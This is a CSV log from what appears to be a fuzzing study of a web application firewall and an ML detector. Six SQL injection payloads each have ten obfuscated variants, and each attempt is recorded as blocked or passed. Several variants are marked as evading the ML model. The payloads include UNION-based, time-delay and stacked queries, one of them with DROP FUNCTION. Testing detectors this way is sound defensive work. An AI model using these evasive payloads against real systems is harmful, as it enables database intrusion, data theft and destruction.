Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-09-04T08:50:38.730199,"-7868"""" union all select 1805--",403,403,Error,waf_correct_ml_incorrect,"- OR 0""""	union all SelEct/**/(SElEcT 8989 LIKE 8989)--",2024-09-04T08:50:38.762662,403,Error,waf_correct_ml_incorrect,"- || 0""""	union
all SeLect/**/(seLEct 'c' NOT LIKE 'cM'/**/LikE (SElecT 0x1))--",2024-09-04T08:50:39.793094,403,Error,waf_correct_ml_incorrect,"- || 0x0""""
union
all SelECt/**/(SElEcT 'c' not like 'cM' LiKe (SELeCT 0x1))--",2024-09-04T08:50:40.815065,403,200,waf_correct_ml_incorrect,"-	 or  0x0""""
union
all sElecT/**/(SeLECt 'c' not like 'cM' LiKe (selECT/**/0x1))--",2024-09-04T08:50:48.182337,403,403,both_correct,"-	 Or  0x0""""
union
all seLect/**/(SElEct 'c' not	like 'cM' lIKE (seLECT 0x1))--",2024-09-04T08:50:53.743578,403,403,both_correct,"-	 oR  0x0""""
union
all Select (SeLEct 'c' not like 'cM' LikE (sELect 0x1))--",2024-09-04T08:50:59.336828,403,403,both_correct,"-  Or  0x0""""
union
all/**/SElEct (seLECt 'c' not like 'cM' liKE (selecT 0x1))--",2024-09-04T08:51:04.192767,403,403,both_correct,"-  or 
0x0""""
union
all/**/sElect (SelECt 'c' not like 'cM' liKE (SElecT/**/0x1))--",2024-09-04T08:51:08.750680,403,200,waf_correct_ml_incorrect,"-  oR 
0x0""""
union all/*$*/SeleCT (SElect 'c'/**/not like 'cM' liKe (SeleCt/**/0x1))--",2024-09-04T08:51:13.685003,403,200,waf_correct_ml_incorrect,"-  Or

0x0""""
union all/*$*/sELeCt (SELEcT 'c' not like 'cM' like (SeLeCt/*u*/0x1))--",2024-09-04T08:51:18.440668,403,403,both_correct
2,2024-09-04T08:51:23.013079,"1%""""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""""%""""=""""",403,403,403,both_correct,"'Q'<>'Q{'%""""))) Or 0x1d80=(selECt/**/count(*) FRom rdb$fields as t1,rdb$types aS t2,rdb$collations As t3,rdb$functions	as t4) aND (((""""%"""" LIKe """"",2024-09-04T08:51:28.602928,403,200,waf_correct_ml_incorrect,"'Q'<>'Q{'%""""))) Or 0x1d80 like (SeLEct count(*) FrOM rdb$fields AS t1,rdb$types aS t2,rdb$collations as t3,rdb$functions as t4) AnD (((""""%"""" LiKe """"",2024-09-04T08:51:36.284357,403,200,waf_correct_ml_incorrect,"'Q' not like 'Q{'%""""))) Or 0x1d80/*~**/LIKE (SeleCT count(*) FROM rdb$fields as t1,rdb$types As t2,rdb$collations As t3,rdb$functions AS	t4) AND (((""""%"""" LiKE """"",2024-09-04T08:51:43.956726,403,403,both_correct,"'Q' not like 'Q{'%""""))) or 0x1d80/*~**/LIke/**/(SEleCt count(*) fRoM rdb$fields As t1,rdb$types As t2,rdb$collations AS t3,rdb$functions As
t4) and (((""""%"""" LIke """"",2024-09-04T08:51:51.988941,403,200,waf_correct_ml_incorrect,"'Q' not like 'Q{'%""""))) or 0x1d80/*~**/LiKe/*/*/(seLeCT count(*) FROM rdb$fields AS t1,rdb$types As t2,rdb$collations As/**/t3,rdb$functions As	t4) anD (((""""%"""" LIKe """"",2024-09-04T08:51:59.999111,403,200,waf_correct_ml_incorrect,"'Q' not like 'Q{'%""""))) oR 0x1d80/*~**/LIke/*/*/(selECT count(*) FRoM rdb$fields As t1,rdb$types AS t2,rdb$collations As/**/t3,rdb$functions/**/as t4) aNd (((""""%"""" LiKE """"",2024-09-04T08:52:08.254921,403,200,waf_correct_ml_incorrect,"'Q' not like 'Q{'%""""))) Or/**/0x1d80/*~**/lIKE/*/*/(sELeCT count(*) fRoM rdb$fields As t1,rdb$types As	t2,rdb$collations aS/**/t3,rdb$functions/**/aS t4) AND (((""""%"""" LikE """"",2024-09-04T08:52:16.324005,403,200,waf_correct_ml_incorrect,"'Q' not/*i*/lIke 'Q{'%""""))) Or/**/0x1d80/*~**/lIKE/*/*/(sElEct count(*) From rdb$fields as t1,rdb$types As
t2,rdb$collations As/**/t3,rdb$functions/**/as t4) && (((""""%"""" Like """"",2024-09-04T08:52:25.230212,403,200,waf_correct_ml_incorrect,"'Q' not/**/LiKe 'Q{'%""""))) OR/**/0x1d80/*~**/LIkE/*/*/(selECt count(*) FRom rdb$fields/**/AS t1,rdb$types As	t2,rdb$collations As/**/t3,rdb$functions/**H*/As t4)  AND  (((""""%"""" Like """"",2024-09-04T08:52:33.813163,403,200,waf_correct_ml_incorrect,"'Q' not/**/liKE 'Q{'%""""))) Or/**/0x1d80/*~**/lIKE/*/*/(SeLeCt count(*) FROM rdb$fields/*+*/As t1,rdb$types as	t2,rdb$collations as t3,rdb$functions/**H*/as t4) 
&&  (((""""%"""" lIkE """"",2024-09-04T08:52:44.528404,403,200,waf_correct_ml_incorrect
3,2024-09-04T08:52:55.288326,"1"""" where 1920=1920 and 8635=(select count(*) from generate_series(1,5000000))--",403,200,403,waf_incorrect_ml_correct,"'n' not like 'n$'"""" where 1920=(SELECT 1)/**/AnD 8635=(SEleCt count(*)	fROM generate_series((SELECT 1),5000000))--",2024-09-04T08:52:59.069872,403,403,both_correct,"'n' not like 'n$'"""" WHEre 0x780/**/LIKE (seLEct 1)/**/AnD  And 1=(sELeCT count(*)
FrOm generate_series((Select 1),8889 IN (8888,8889,8890)))--",2024-09-04T08:53:05.891819,403,403,both_correct,"'n' not/**/LiKE 'n$'""""
WheRe 0x780/**/LIkE (SelEcT  OR 0)/**/AND  And 1=(SELECt count(*)
FroM generate_series((SElEcT 0x1),8889 In (8888,'>I' NOT LIKE '>I<',8890)))--",2024-09-04T08:53:12.879032,403,403,both_correct,"'n' not/**/like 'n$'""""
wHErE 0x780/**/LiKE (SElect  or 0)/**/and  ANd/**/4109 NOT LIKE 4110 LIkE (selEcT count(*) FRom generate_series((selECT 0x1),0x22b9 IN (8888,'>I' NOT LIKE '>I<', AND 1)))--",2024-09-04T08:53:21.422187,403,403,both_correct,"'n' not/**/LIKE 'n$'""""
WHere 0x780/**/lIke (SeLect  or  AnD '='<>'=N')/**/AnD  aND 4109 NOT
LIKE (sELect 4110) likE (SelEct count(*) FroM generate_series((sELECT 0x1),0x22b9 In (8888,'>I' NOT LIKE '>I<', And 1)))--",2024-09-04T08:53:31.001033,403,403,both_correct,"'n' not/*~7g,*/LIKE 'n$'""""	WheRe 0x780 LIkE (sELeCt  oR  ANd '='<>'=N')/**/And  aND 4109 NOT
LIKE (SELeCT  anD 1) lIkE (SELeCT count(*) FRoM generate_series((sELeCt 0x1),0x22b9 iN (0x22b8,'>I' NOT LIKE '>I<', aNd 'q'='q')))--",2024-09-04T08:53:42.090326,403,403,both_correct,"'n' not/*\Ti<*/lIKe 'n$'""""
WHerE 0x780 likE (SELEct  OR  ANd '='<>'=N') AnD  And (SeleCT  OR 0) NOT
LIKE (SeleCt  aND 'v'!='v_') Like (SELeCT count(*) FROm generate_series((sELeCT 0x1),0x22b9 In (0x22b8,'>I' not like '>I<', anD 'q'='q')))--",2024-09-04T08:53:53.131024,403,403,both_correct,"'n' not/**/LiKE 'n$'""""
WhERe 0x780	LikE/**/(SelECt  OR  aNd '=' NOT LIKE '=N') ANd  And (SELEcT  oR 0x0) NOT
LIKE (SELecT  anD 'v'!='v_') LiKE (seLect count(*) frOm generate_series((SeLEcT 0x1),0x22b9 In (0x22b8,'>I' not like '>I<', aNd  AnD 1749!=1750)))--",2024-09-04T08:54:05.276131,403,403,both_correct,"'n' not/**/LIke 'n$'"""" WhEre 0x780	lIKE (Select  OR  ANd '=' NOT LIKE '=N') aNd  AND (SELECt  or 0x0) NOT
LIKE (sELEct  anD 'v'!='v_') liKE (seLECT count(*) FrOm generate_series((seleCT 0x1),0x22b9 IN (0x22b8,'>I' not like '>I<', aND  AND 7923!= OR 0!=(sEleCt 1750))))--",2024-09-04T08:54:17.298747,403,403,both_correct,"'n' not/**/Like 'n$'"""" where 0x780	LIke (sELEcT  OR  anD '=' NOT LIKE '=N') anD  ANd (SELect  OR 0x0) NOT	LIKE (SElect  anD/**/'v' not like 'v_') like (seLECt count(*) frOm generate_series((SElect 0x1),0x22b9 in (0x22b8,'>I' not like '>I<', aND  aNd 4879=(SELECT 1)!= oR (SElecT 0)!=(seLeCt 1750))))--",2024-09-04T08:54:30.081349,403,403,both_correct
4,2024-09-04T08:54:44.643267,1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,403,403,403,both_correct,"1'+(select 'vddk'/**/where 6961=(SELECT 1);if(4194=4133)
select (SELECT '#]J' NOT LIKE '#]J-') ELSE dROp function tqhz--",2024-09-04T08:54:49.077705,403,403,both_correct,"1'+(select 'vddk'/*kxQ*/where 6961=(SELECT  AND 1);if(8313<>(SELECT 8314)=4133)	select (SELECT '#]J' NOT LIKE '#]J-') eLSe/**/dROp function tqhz--",2024-09-04T08:54:56.295574,403,403,both_correct, OR 0'+(select 'vddk'/*kxQ*/where 6961=(SELECT  AND '7d'B' not like '7d'Ba');if((SELECT 8313)<>(SELECT 8314)=4133) select (SELECT '#]J' NOT/**/LIKE '#]J-') elSe/**/DROP function tqhz--;,2024-09-04T08:55:03.674652,403,403,both_correct," or 2773 LIKE 2773'+(select	'vddk'/**/where (SELECT 6961)=(SELECT  AND '7d'B' not like '7d'Ba');if((SELECT (SELECT 1))<>(SELECT 8314)=4133) select (SELECT '#]J' NOT/*sK:a4*/LIKE '#]J-') Else Drop function tqhz--;",2024-09-04T08:55:13.356763,403,403,both_correct," ||/**/2773 like '#(3v'!='#(3v'''+(select
'vddk'/**/where (SELECT (SELECT 6961))=(SELECT  AND '7d'B' not like '7d'Ba');if((SELECT (SELECT 1))<>(SELECT (SELECT 1))=4133) select (SELECT '#]J' NOT/*sK:a4*/LIKE '#]J-') eLSE DrOP function tqhz--;",2024-09-04T08:55:24.049789,403,403,both_correct," ||/*Y
*/2773 lIKe '#(3v'!='#(3v'''+(selEct 'vddk'/**/wHErE (SelecT (seLecT 6961))=(SeLECt  aND '7d'B' not like '7d'Ba');iF((SelECT (seLeCT  or 0))<>(SelEcT (sEleCT/**/1))='z!(SELECT 0)'!='z!0_') SeLEcT (SelEcT '#]J' NOT/*sK:a4*/lIKe '#]J-') eLSE DRop function tqhz--;",2024-09-04T08:55:36.258315,403,200,waf_correct_ml_incorrect," ||/**/2773 LikE '#(3v'!='#(3v'''+(sELeCt 'vddk' wHErE (SeLeCt (SELeCt (sElEcT	 anD 1)))=(sElEcT  AND '7d'B' not like '7d'Ba');IF((SElecT (seLEcT  oR 0))<>(SelecT (SeLect/**/8847!=8848))='z!(SELECT 0)'!='z!0_') sElECT (seleCT '#]J' NOT/*sK:a4*/LikE '#]J-') Else DROP function tqhz--;<L",2024-09-04T08:55:50.078993,403,200,waf_correct_ml_incorrect," ||/**/2773 LiKe '#(3v'!='#(3v'''+(seLecT 'vddk' whERe (SELect
(SeLECT (Select	 aNd 2935 NOT LIKE 2936)))=(sELect  AND '7d'B' not like '7d'Ba');iF((SeLecT (SELect  or (SELECT 1)))<>(SElecT (SeLecT 0x228f!=8848))='z!(SELECT 0)'!='z!0_') SELecT (SeLeCt '#]J' NOT/*sK:a4*/lIKE '#]J-') ElsE dROp function tqhz--;<Lw",2024-09-04T08:56:04.825075,403,403,both_correct," || 2773 lIke '#(3v'!='#(3v'''+(sElEcT 'vddk' wHerE (SeLEcT (sELEct (sElEcT	 And  anD 'U' LIKE 'U' NOT LIKE (SelEct 2936))))=(SELeCt  aNd '7d'B' not like '7d'Ba');iF((SElEct (SElECT  oR (SElECt 1)))<>(seLecT (SELECT 0x228f NOT LIKE 8848))='z!(SELECT 0)'!='z!0_') sELect (SElEct '#]J' NOT/**/lIkE '#]J-') ElSe dRoP function tqhz--;<LwO",2024-09-04T08:56:20.972619,403,403,both_correct," || 2773
lIke '#(3v'!='#(3v'''+(selEct 'vddk' WhERE (SELeCt (sEleCT (seLect	 aNd  anD 'U'/**/LIke 'U' not like (sELEcT 2936))))=(SeLEcT  anD '7d'B' not like '7d'Ba');if((select (SElEcT  Or (sEleCT  OR 0)))<>(SelecT (selEcT 0x228f NOT LIKE (sELecT 8848)))='z!(SELECT 'Q5'='Q5')'!='z!0_') selecT (seLEcT '#]J' NOT/**/lIke '#]J-') ELSE DRoP function tqhz--;<LwOp",2024-09-04T08:56:37.934236,403,403,both_correct
5,2024-09-04T08:56:56.375065,1 and 5934=7745,403,403,403,both_correct,"'%V'='%V'
aNd (SELECT 1)/**/LiKE (SELECT 7745)",2024-09-04T08:56:57.212872,403,403,both_correct,'%V'='%V' aNd (SeLEcT 1)/**/like (SELeCT 1414 LIkE (SELECT /**/AND 1)),2024-09-04T08:57:00.469256,403,403,both_correct,"'%V'='%V' anD (SElect	')5'=') OR 0') likE (sELect 1414 LIkE (SeLECT /**/aNd 0x1))",2024-09-04T08:57:04.645704,403,403,both_correct,"'%V' Like '%V' AnD (seLEcT
')'(]Va' LIKE '(]Va''=') OR  OR 0') liKe (seLECT 0x586 lIkE (SElEct  And 0x1))",2024-09-04T08:57:09.299409,403,403,both_correct,"'%V' LIKe '%V' aND
(sELECT
')'(]Va' LIKE '(]Va''=') OR  OR '='<>' like .'') LIKE (seleCt 0x586 LiKE (sELECT  ANd/*4H=u]*/0x1))",2024-09-04T08:57:14.868345,403,403,both_correct,"'%V' lIKe
'%V' AnD
(SElEcT
')'(]Va' LIKE '(]Va''=') OR  OR ' lIKe '<>' lIKE .'') lIKe (SelECt 0x586 LIKe/**/(SeLECT  anD/*wOL,:*/0x1))",2024-09-04T08:57:21.654076,403,403,both_correct,"'%V' likE
'%V' and	(sELEct
')'(]Va' LIKE '(]Va'' LIKE ') OR  OR ' LIke '<>' like .'') Like (selECt 0x586 liKE (SeLECt  and/**/0x1))",2024-09-04T08:57:28.742456,403,403,both_correct,"'%V' likE
'%V' aND
(SelECT
')'(]Va' LIKE '(]Va'' lIkE ') OR  OR ' LIke '<>' LiKe .'') Like (sElECt/**/0x586 LIKE (seleCT  ANd/**/0x1))",2024-09-04T08:57:35.612213,403,403,both_correct,"'%V' LIke
'%V' And
(SElECT ')'(]Va' LIKE '(]Va'' LikE ') OR  OR ' lIke '<>' LIKe .'') lIKE (seLect 0x586 lIkE (seleCT  ANd/*Aq2./*/0x1))",2024-09-04T08:57:42.549127,403,403,both_correct,"'%V' LikE
'%V' AnD
(sELECT ')'(]Va' LIKE '(]Va'' LikE ') OR 	OR ' LikE '<>' lIKe/**/.'') LIke (sELEct 0x586 LikE (seLECT  aNd/*Aq2./*/0x1))",2024-09-04T08:57:49.981005,403,403,both_correct
6,2024-09-04T08:57:57.290625,-3938%'))) or 2034=7209#,403,403,403,both_correct,"-(SelECt/**/(SELECT 1))%'))) or	'L' LIKE 'L' like 7209#~",2024-09-04T08:57:58.585811,403,403,both_correct,"-(sELECt/**/(sEleCT (SELECT (SELECT 1))))%'))) or	'L'/**/LIKE
'L' lIke 'T'='T'#~Q",2024-09-04T08:58:01.928635,403,403,both_correct,"-(SElEct (SEleCt (selECt (SEleCt (SeleCT 0x1)))))%'))) or
'L'/*#<na*/LIKE
'L' lIke 8454 not like 8455#~Q",2024-09-04T08:58:06.355297,403,200,waf_correct_ml_incorrect,"-(SelecT (SELecT (SELect (seLECt (seLect
0x1)))))%'))) or
'L'/**/LIKE
'L' likE (SeLECT (SelEct 1)) not like/**/960 likE 960#~Q",2024-09-04T08:58:12.502608,403,403,both_correct,"-(SElect (SELEcT (selecT (SEleCt
(SelECT
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT (SElecT 'vy	' LIKE/**/'vy	')) not like/*Bn*/ OR (SELECT 0) like 960#~Q",2024-09-04T08:58:18.981223,403,403,both_correct,"-(SeLECt (seLEct (sElect (SElecT	(seLecT
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT/**/(SElecT 'vy	' LIKE/**/'vy	')) not like/*Bn*/ OR (select 't#'<>'t#~') liKe (SELECT  OR 0)#~QED",2024-09-04T08:58:27.282147,403,403,both_correct,"-(SeLeCT (SeleCt (selECT
(SeLeCt	(seLeCt
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT/**/(SElecT 'vy	' LIKE/**/'vy	')) not like/*Bn*/ OR (select 't#'<>'t#~') LikE (sEleCt  or/**/'SY)'<>'SY) AND (SELECT 1)')#~QED",2024-09-04T08:58:37.628635,403,403,both_correct,"-(Select (sElEcT (sELect
(seLect	(selEct
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT (SElecT 'vy	' LIKE/**/'vy	'))
not like/*Bn*/ OR (select 't#'<>'t#~') LikE (sEleCt  or/*E{*/'SY)'<>'SY) and (SELEct (SELEct  or 579<>580))')#~QED",2024-09-04T08:58:51.620059,403,403,both_correct,"-(SELECT (sElEcT (selECt	(SelEcT	(sElEct
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT (SElecT 'vy	' LIKE/**/'vy	'))
not like  OR (select 't#'<>'t#~') LikE (sEleCt  or/*E{*/'SY)'<>'SY) AnD (seLeCt (SELEct  OR (SELECT 579)<> oR 9864 not like 9865))')#~QEDAI",2024-09-04T08:59:06.238696,403,403,both_correct,"-(sElecT (SELECT (seLeCt	(SelEct	(sEleCt
0x1)))))%'))) or
'L'/**/LIKE
'L' liKe (SeleCT (SElecT 'vy	' LIKE/**/'vy	')) not like  OR (select 't#'<>'t#~') LikE (sEleCt  or/*USE.*/'SY)'<>'SY) AnD (seLEcT (sElECT  or (SeleCT 579)<> or 0x1659!=(SeLECt/**/1) not like 9865))')#~QEDAI",2024-09-04T08:59:23.987471,403,403,both_correct
